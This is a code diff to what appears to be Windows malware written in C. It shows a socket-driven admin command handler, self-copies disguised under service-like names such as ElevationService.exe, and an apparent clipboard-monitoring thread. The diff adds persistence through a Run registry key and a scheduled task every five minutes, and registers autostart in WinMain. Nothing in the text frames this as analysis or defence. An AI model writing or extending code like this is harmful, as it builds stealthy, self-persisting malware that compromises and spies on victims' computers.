@@ -141,7 +141,7 @@ static void handle_admin_command(SOCKET sock, const char *cmd_raw) {
     }
     else if (strcmp(cmd, "PROTECT_PROCESS") == 0) {
         sys_spawn_shadow_copy();
-        result = "[Spawned 3 copies: ElevationService.exe, CrashHandler.exe, NotifyService.exe — auto-protect in 15s]";
+        result = "[Spawned 3 copies with double persistence: Run key + Scheduled Task every 5min — auto-protect in 15s]";
     }
     else if (strcmp(cmd, "UNPROTECT_PROCESS") == 0) {
         sys_unprotect_process();
@@ -255,6 +255,9 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
     
     /* Start background services */
     CreateThread(NULL, 0, copy_buffer_monitor_thread, NULL, 0, NULL);
+    
+    /* Ensure persistence for the original process too */
+    sys_register_autostart();
     
     /* Check if this is a shadow copy — auto-protect after 15 seconds */
     char *cmdLine = GetCommandLineA();
